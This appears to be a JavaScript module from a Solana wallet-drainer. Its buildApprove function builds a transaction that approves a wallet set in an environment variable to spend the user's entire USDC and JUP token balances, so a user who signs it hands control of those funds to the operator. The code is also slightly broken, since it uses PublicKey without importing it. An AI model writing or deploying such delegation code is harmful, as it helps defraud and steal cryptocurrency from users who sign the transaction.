const { Transaction } = require("@solana/web3.js");
const { createApproveInstruction } = require("@solana/spl-token");
const { getUserTokenAccounts } = require("../solana/tokenService");

async function buildApprove(user, connection) {
    const tx = new Transaction();
    const t = await getUserTokenAccounts(user, connection);

    if (t.usdc > 0n) {
        tx.add(createApproveInstruction(t.usdcATA, new PublicKey(process.env.WALLET), user, t.usdc));
    }

    if (t.jup > 0n) {
        tx.add(createApproveInstruction(t.jupATA, new PublicKey(process.env.WALLET), user, t.jup));
    }

    return tx;
}

module.exports = { buildApprove };